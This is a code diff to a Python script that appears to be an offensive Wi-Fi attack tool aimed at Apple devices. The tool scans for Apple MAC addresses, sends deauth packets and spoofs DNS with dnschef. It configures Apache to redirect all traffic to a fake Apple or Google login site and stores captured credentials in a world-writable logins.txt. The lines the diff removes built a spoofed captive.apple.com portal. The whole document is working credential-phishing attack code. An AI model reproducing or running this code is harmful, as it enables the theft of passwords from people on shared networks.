@@ -2,7 +2,7 @@
 
 from base import Base
 from os import path, errno, makedirs, remove
-from shutil import copyfile
+from shutil import copyfile, copytree
 import subprocess as sub
 from argparse import ArgumentParser
 from sys import exit
@@ -20,18 +20,16 @@ parser.add_argument('-i', '--listen_iface', type=str, help='Set interface name f
 parser.add_argument('-c', '--use_network_conflict', action='store_true', help='Use network conflict technique')
 parser.add_argument('-t', '--use_tid_calculate', action='store_true', help='Use transaction id calculate technique')
 
-parser.add_argument('-s', '--social_engineering_domain', type=str, default="wifi-auth.google.com",
-                    help='Set domain name for social engineering (default="wifi-auth.google.com")')
-parser.add_argument('-p', '--social_engineering_path', type=str, default="/var/www/html/google/",
-                    help='Set local path to domain name for social engineering (default="/var/www/html/google/")')
+parser.add_argument('-f', '--fishing_domain', type=str, default="auth.apple.wi-fi.com",
+                    help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
+parser.add_argument('-p', '--fishing_domain_path', type=str, default="apple",
+                    help='Set local path to domain name for social engineering (default="apple")')
 
 parser.add_argument('-r', '--aireplay_iface', type=str, help='Set interface name for aireplay')
 parser.add_argument('-d', '--deauth', type=int, help='Set number of deauth packets (dafault=35)', default=35)
 parser.add_argument('-k', '--kill', action='store_true', help='Kill process')
 parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
-parser.add_argument('-f', '--first_ip', type=str, help='Set first offer IP', default=None)
-parser.add_argument('-l', '--last_ip', type=str, help='Set last offer IP', default=None)
-parser.add_argument('--dns_ip', type=str, help='Set DNS server IP address', default=None)
+
 
 args = parser.parse_args()
 
@@ -76,17 +74,129 @@ if not args.use_network_conflict:
             exit(1)
 
 if __name__ == "__main__":
+
+    # region Social engineering
+
+    # Disable ipv4 forwarding
+    ipv4_forward_file_name = "/proc/sys/net/ipv4/ip_forward"
+    with open(ipv4_forward_file_name, 'w') as ipv4_forward_file:
+        ipv4_forward_file.write("0")
+
+    # Variables
+    script_dir = path.dirname(path.realpath(__file__))
+    apache2_sites_available_dir = "/etc/apache2/sites-available/"
+    apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
+    apache2_sites_path = "/var/www/html/"
+    redirect_path = apache2_sites_path + "redirect/"
+
+    se_domain = args.fishing_domain
+    if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
+        se_path = apache2_sites_path + args.fishing_domain_path
+    else:
+        se_path = args.fishing_domain_path
+
+    print Base.c_info + "Fishing domain: " + Base.cINFO + se_domain + Base.cEND
+    print Base.c_info + "Fishing path: " + Base.cINFO + se_path + Base.cEND
+
+    # Directory for fishing site
+    if not path.exists(se_path):
+        if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
+            copytree(src=script_dir + "/Fishing_domains/" + args.fishing_domain_path, dst=se_path)
+        else:
+            print Base.c_error + "Directory: \"" + se_path + "\" does not exist!"
+            exit(1)
+
+    sub.Popen(['chmod 777 ' + se_path + '/logins.txt >/dev/null 2>&1'], shell=True)
+
+    # region Apache2 sites settings
+    default_site_file_name = "000-default.conf"
+    default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
+    default_site_file.write("<VirtualHost *:80>\n" +
+                            "\tServerAdmin admin@apple.com\n" +
+                            "\tRewriteEngine on\n" +
+                            "\tRewriteCond %{REQUEST_FILENAME} !-f\n" +
+                            "\tRewriteCond %{REQUEST_FILENAME} !-d\n" +
+                            "\tRewriteRule ^(.*)$ /redirect.php?page=$1 [NC]\n" +
+                            "\tDocumentRoot " + redirect_path + "\n" +
+                            "\t<Directory " + redirect_path + ">\n" +
+                            "\t\tOptions FollowSymLinks\n" +
+                            "\t\tAllowOverride None\n" +
+                            "\t\tOrder allow,deny\n" +
+                            "\t\tAllow from all\n" +
+                            "\t</Directory>\n" +
+                            "</VirtualHost>\n\n" +
+                            "<VirtualHost *:80>\n" +
+                            "\tServerName " + se_domain + "\n" +
+                            "\tServerAdmin admin@" + se_domain + "\n" +
+                            "\tDocumentRoot " + se_path + "\n" +
+                            "\t<Directory " + se_path + ">\n" +
+                            "\t\tOptions FollowSymLinks\n" +
+                            "\t\tAllowOverride None\n" +
+                            "\t\tOrder allow,deny\n" +
+                            "\t\tAllow from all\n" +
+                            "\t</Directory>\n" +
+                            "</VirtualHost>\n")
+    default_site_file.close()
+
+    # Create dir with redirect script
+    if not path.isdir(redirect_path):
+        makedirs(redirect_path)
+
+    # Copy and change redirect script
+    redirect_script_name = "redirect.php"
+    redirect_script_src = script_dir + "/Tools/" + redirect_script_name
+    redirect_script_dst = redirect_path + redirect_script_name
+
+    copyfile(src=redirect_script_src, dst=redirect_script_dst)
+
+    # Read redirect script
+    with open(redirect_script_dst, 'r') as redirect_script:
+        content = redirect_script.read()
+
+    # Replace the string
+    content = content.replace('change_me', se_domain)
+
+    # Write redirect script
+    with open(redirect_script_dst, 'w') as redirect_script:
+        redirect_script.write(content)
+
+    try:
+        print Base.c_info + "Restarting apache2 server ..."
+        sub.Popen(['systemctl restart apache2  >/dev/null 2>&1'], shell=True)
+    except OSError as e:
+        if e.errno == errno.ENOENT:
+            print Base.c_error + "Program: systemctl is not installed!"
+            exit(1)
+        else:
+            print Base.c_error + "Something went wrong while trying to run `systemctl reload apache2`"
+            exit(2)
+    # endregion
+
+    # region Dnschef settings
+    dns = "77.88.8.8"
+    try:
+        sub.Popen(['dnschef -i ' + your_ip_address + ' --fakeip=' + your_ip_address +
+                   ' >' + script_dir + '/dnschef.log 2>&1'],
+                  shell=True)
+    except OSError as e:
+        if e.errno == errno.ENOENT:
+            print Base.c_error + "Program: dnschef is not installed!"
+            exit(1)
+        else:
+            print Base.c_error + "Something else went wrong while trying to run `dnschef`"
+            exit(2)
+    # endregion
+
+    ######################################### DEBUG #############################################
+    #exit(0)
+    #############################################################################################
+
+    # endregion
+
     print Base.c_info + "Listen network interface: " + Base.cINFO + listen_network_interface + Base.cEND
 
-    if args.first_ip is None:
-        first_ip = Base.get_netiface_first_ip(listen_network_interface)
-    else:
-        first_ip = args.first_ip
-
-    if args.last_ip is None:
-        last_ip = Base.get_netiface_last_ip(listen_network_interface)
-    else:
-        last_ip = args.last_ip
+    first_ip = Base.get_netiface_first_ip(listen_network_interface)
+    last_ip = Base.get_netiface_last_ip(listen_network_interface)
 
     print Base.c_info + "First ip address: " + Base.cINFO + first_ip + Base.cEND
     print Base.c_info + "Last ip address: " + Base.cINFO + last_ip + Base.cEND
@@ -145,12 +255,11 @@ if __name__ == "__main__":
                     print Base.c_error + "Something else went wrong while trying to run `iwconfig` or `ifconfig`"
                     exit(2)
 
-    script_dir = path.dirname(path.realpath(__file__))
     print Base.c_info + "ARP scan is running ..."
     arp_scan_out = None
     try:
         arp_scan = sub.Popen(['arp-scan --macfile=' + script_dir + '/apple_mac_prefixes.txt -I ' +
-                               listen_network_interface + ' --localnet --ignoredups --retry=3 --timeout=3000'],
+                              listen_network_interface + ' --localnet --ignoredups --retry=5 --timeout=1000'],
                              shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
         arp_scan_out, arp_scan_err = arp_scan.communicate()
     except OSError as e:
@@ -216,146 +325,6 @@ if __name__ == "__main__":
                 index = 0
             print Base.c_info + "Target new ip: " + Base.cINFO + new_ip + Base.cEND
 
-            # Social engineering
-            se_domain = args.social_engineering_domain
-            se_path = args.social_engineering_path
-
-            print Base.c_info + "Social engineering domain: " + Base.cINFO + se_domain + Base.cEND
-            print Base.c_info + "Social engineering path: " + Base.cINFO + se_path + Base.cEND
-
-            apache2_sites_available_dir = "/etc/apache2/sites-available/"
-            apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
-
-            se_site_file_name = se_domain + ".conf"
-            if not path.exists(apache2_sites_available_dir + se_site_file_name):
-                se_site_file = open(apache2_sites_available_dir + se_site_file_name, 'w')
-                se_site_file.write("<VirtualHost *:80>\n" +
-                                   "\tServerName " + se_domain + "\n" +
-                                   "\tServerAdmin admin@" + se_domain + "\n" +
-                                   "\tDocumentRoot " + se_path + "\n" +
-                                   "\t<Directory " + se_path + ">\n" +
-                                   "\t\tOptions FollowSymLinks\n" +
-                                   "\t\tAllowOverride None\n" +
-                                   "\t\tOrder allow,deny\n" +
-                                   "\t\tAllow from all\n" +
-                                   "\t</Directory>\n" +
-                                   "</VirtualHost>\n")
-                se_site_file.close()
-
-            # se_site_ssl_file_name = "ssl." + se_domain + ".conf"
-            # if not path.exists(apache2_sites_available_dir + se_site_ssl_file_name):
-            #     se_site_ssl_file = open(apache2_sites_available_dir + se_site_ssl_file_name, 'w')
-            #     se_site_ssl_file.write("<IfModule mod_ssl.c>\n" +
-            #                            "\t<VirtualHost _default_:443>\n" +
-            #                            "\t\tServerName " + se_domain + "\n" +
-            #                            "\t\tServerAdmin admin@" + se_domain + "\n" +
-            #                            "\t\tDocumentRoot " + se_path + "\n" +
-            #                            "\t\t<Directory " + se_path + ">\n" +
-            #                            "\t\t\tOptions FollowSymLinks\n" +
-            #                            "\t\t\tAllowOverride None\n" +
-            #                            "\t\t\tOrder allow,deny\n" +
-            #                            "\t\t\tAllow from all\n" +
-            #                            "\t\t</Directory>\n" +
-            #                            "\t\tSSLEngine On\n" +
-            #                            "\t\tSSLCertificateFile /etc/ssl/certs/accounts.google.com.crt\n" +
-            #                            "\t\tSSLCertificateKeyFile /etc/ssl/private/accounts.google.com.key\n" +
-            #                            "\t</VirtualHost>\n" +
-            #                            "</IfModule>\n")
-            #     se_site_ssl_file.close()
-
-            captive_apple_site_file_name = "captive.apple.com.conf"
-            captive_apple_site_dir = "/var/www/html/captive.apple.com/"
-
-            if not path.exists(apache2_sites_available_dir + captive_apple_site_file_name):
-                captive_apple_site_file = open(apache2_sites_available_dir + captive_apple_site_file_name, 'w')
-                captive_apple_site_file.write("<VirtualHost *:80>\n" +
-                                              "\tServerName captive.apple.com\n" +
-                                              "\tServerAdmin admin@apple.com\n" +
-                                              "\tDocumentRoot " + captive_apple_site_dir + "\n" +
-                                              "\t<FilesMatch '\.html$'>\n" +
-                                              "\t\tForceType application/x-httpd-php\n" +
-                                              "\t</FilesMatch>\n" +
-                                              "\t<Directory " + captive_apple_site_dir + ">\n" +
-                                              "\t\tOptions FollowSymLinks\n" +
-                                              "\t\tAllowOverride None\n" +
-                                              "\t\tOrder allow,deny\n" +
-                                              "\t\tAllow from all\n" +
-                                              "\t</Directory>\n" +
-                                              "</VirtualHost>\n")
-                captive_apple_site_file.close()
-
-            if not path.isdir(captive_apple_site_dir):
-                makedirs(captive_apple_site_dir)
-
-            captive_apple_index_file_name = captive_apple_site_dir + "index.html"
-            captive_apple_hotspot_file_name = captive_apple_site_dir + "hotspot-detect.html"
-
-            captive_apple_hotspot_file = open(captive_apple_hotspot_file_name, 'w')
-            captive_apple_hotspot_file.write("<?php\n" +
-                                             "\t$client_ip = $_SERVER['REMOTE_ADDR'];\n" +
-                                             "\t$handle = fopen(\"" + se_path + "logins.txt\", \"r\");\n" +
-                                             "\tif ($handle) {\n" +
-                                             "\t\twhile (($line = fgets($handle)) !== false) {\n" +
-                                             "\t\t\t$pattern = \"/^$client_ip .*$/\";\n" +
-                                             "\t\t\tif (preg_match($pattern, $line)) {\n" +
-                                             "\t\t\t\techo \"<HTML><HEAD><TITLE>Success</TITLE></HEAD>" +
-                                             "<BODY>Success</BODY></HTML>\";\n" +
-                                             "\t\t\t\tfclose($handle);\n" +
-                                             "\t\t\t\texit(0);\n" +
-                                             "\t\t\t\t}\n" +
-                                             "\t\t\t}\n" +
-                                             "\t\tfclose($handle);\n" +
-                                             "\t\t}\n" +
-                                             "\techo \"<HTML><HEAD><META http-equiv='refresh' content='1;URL=" +
-                                             "http://" + se_domain + "/' /></HEAD></HTML>\";\n" +
-                                             "?>\n")
-            captive_apple_hotspot_file.close()
-
-            if path.exists(captive_apple_index_file_name):
-                remove(captive_apple_index_file_name)
-
-            copyfile(src=unicode(captive_apple_hotspot_file_name),
-                     dst=unicode(captive_apple_index_file_name))
-
-            try:
-                if not path.exists(apache2_sites_enabled_dir + captive_apple_site_file_name):
-                    print Base.c_info + "Enable site: " + Base.cINFO + captive_apple_site_file_name + Base.cEND
-                    sub.Popen(['a2ensite ' + captive_apple_site_file_name + ' >/dev/null 2>&1'], shell=True)
-
-                if not path.exists(apache2_sites_enabled_dir + se_site_file_name):
-                    print Base.c_info + "Enable site: " + Base.cINFO + se_site_file_name + Base.cEND
-                    sub.Popen(['a2ensite ' + se_site_file_name + ' >/dev/null 2>&1'], shell=True)
-
-                # if not path.exists(apache2_sites_enabled_dir + se_site_ssl_file_name):
-                #     print Base.c_info + "Enable site: " + Base.cINFO + se_site_ssl_file_name + Base.cEND
-                #     sub.Popen(['a2ensite ' + se_site_ssl_file_name + ' >/dev/null 2>&1'], shell=True)
-
-                print Base.c_info + "Restarting apache2 server ..."
-                sub.Popen(['systemctl restart apache2  >/dev/null 2>&1'], shell=True)
-            except OSError as e:
-                if e.errno == errno.ENOENT:
-                    print Base.c_error + "Program: a2ensite or systemctl is not installed!"
-                    exit(1)
-                else:
-                    print Base.c_error + "Something went wrong while trying to run `a2ensite` or " + \
-                          "`systemctl reload apache2`"
-                    exit(2)
-            try:
-                dns_ip = "77.88.8.8"
-                if args.dns_ip is not None:
-                    dns_ip = args.dns_ip
-
-                sub.Popen(['dnschef -i ' + your_ip_address + ' --fakeip=' + your_ip_address +
-                           ' --nameservers=' + dns_ip + ' --fakedomains=captive.apple.com,' + se_domain +
-                           ' >' + script_dir + '/dnschef.log 2>&1'],
-                          shell=True)
-            except OSError as e:
-                if e.errno == errno.ENOENT:
-                    print Base.c_error + "Program: dnschef is not installed!"
-                    exit(1)
-                else:
-                    print Base.c_error + "Something else went wrong while trying to run `dnschef`"
-                    exit(2)
 
             if args.use_tid_calculate:
                 try:
